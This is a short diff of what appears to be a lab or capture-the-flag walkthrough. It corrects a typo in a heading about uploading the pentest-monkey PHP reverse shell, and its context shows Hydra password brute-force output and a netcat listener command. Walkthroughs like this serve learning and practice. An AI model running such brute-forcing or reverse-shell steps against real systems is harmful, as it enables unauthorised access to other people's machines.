@@ -76,7 +76,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-03 19:38:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-03 19:42:14
 ```
-### Once connected, I upload the prentest-monkey.php reverse shell
+### Once connected, I upload the pentest-monkey.php reverse shell
 ```bash
 nc -lnvp 4444
 ```
